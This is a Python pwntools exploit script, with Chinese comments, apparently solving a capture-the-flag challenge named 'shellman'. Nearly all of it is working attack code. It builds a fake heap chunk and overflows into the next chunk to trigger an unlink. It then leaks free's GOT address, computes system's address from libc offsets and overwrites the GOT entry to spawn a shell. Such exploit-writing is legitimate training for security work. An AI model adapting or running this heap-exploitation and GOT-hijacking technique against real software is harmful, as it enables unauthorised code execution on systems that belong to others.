# coding:utf-8
from pwn import *

p = process('./shellman')
#p = remote('127.0.0.1', 12345)

def list_sh():
    p.recvuntil('>')
    p.sendline('1')
    p.recvuntil('SHELLC0DE 0: ')
    recv_addr = p.read(8 * 2) #这里注意对读取的地址进行适当的转换
    ret_addr = ''
    for i in range(8):
        ret_addr += recv_addr[2*i+1] + recv_addr[2*i]
    print type(recv_addr), len(recv_addr), recv_addr
    print type(ret_addr), len(ret_addr), ret_addr
    return int(ret_addr[::-1], 16)

def new_sh(sh_str):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil(':')
    p.sendline(str(len(sh_str)))
    p.recvuntil(':')
    p.send(sh_str)
    p.recvuntil('Successfully created a new shellcode.')


def edit_sh(number, sh_str):
    p.recvuntil('>')
    p.sendline('3')
    p.recvuntil(':')
    p.sendline(str(number))
    p.recvuntil(':')
    p.sendline(str(len(sh_str)))
    p.recvuntil(':')
    p.send(sh_str)

def del_sh(number):
    p.recvuntil('>')
    p.sendline('4')
    p.recvuntil(':')
    p.sendline(str(number))

def main():
    # 创建两个chunk
    first_size = 0xa0
    second_size = 0xa0
    new_sh('A'*first_size)
    new_sh('B'*second_size)
    new_sh('/bin/sh;')
    # 构造第一个区的信息
    PREV_IN_USE = 0x1
    prev_size_0 =   p64(0)
    size_0      =   p64(first_size | PREV_IN_USE)
    fd_0        =   p64(0x6016d0 - 0x18)
    bk_0        =   p64(0x6016d0 - 0x10)            # 0x6016c0可以从bss段找到 加上flag 和 length的偏移就是第一个name_ptr了
    data_0      =   'p'*(first_size-0x20)           # 去掉header 这里是构造chunk0为free chunk 所以算上fd和bk
    prev_size_1 =   p64(first_size)
    size_1      =   p64(second_size + 0x10)         # 0x10为header大小 因为不是free chunk 所以没有fd和bk
    payload1 = prev_size_0 + size_0 + fd_0 + bk_0 + data_0  #first fake free chunk
    payload1 += prev_size_1 + size_1                        #second chunk header
    edit_sh(0, payload1)            # 覆盖chunk
    # 触发unlink
    del_sh(1);
    free_got_addr = 0x0000000000601600
    # *0x6016d0 = 0x6016d0 - 0x18 即shell_0的name_ptr已经变成了shell_0的首地址
    rubbish = p64(0x0)                              # 这里从程序看 0x6010b8 是无关紧要的
    is_shellcode_exist = p64(0x1)                   # flag
    shellcode_size = p64(0xa)                       # 要打印的字符串长度 10*%02x
    libc_free_got = p64(free_got_addr)              # got表中free的地址
    payload2 = rubbish + is_shellcode_exist + shellcode_size + libc_free_got
    # leak
    edit_sh(0, payload2)
    free_address = list_sh()
    print "free_address:", hex(free_address)
    # 计算system地址
    lib_sys_addr =  0x0000000000046590      # 如果在本机测试, 用ldd查看下程序装载的so库, 然后到该库中objdump -T 查找对应函数就好了
    lib_free_addr = 0x0000000000082d00
    #lib_sys_addr =  0x46640                # 这里是在提供的so中找到的
    #lib_free_addr = 0x82df0
    system_addr = free_address - lib_free_addr + lib_sys_addr
    print "system_addr:", hex(system_addr)
    # 修改got表中free地址为system
    edit_sh(0, p64(system_addr))
    # 触发free(实际上已经修改成了system)
    del_sh(2)
    p.interactive()

main()
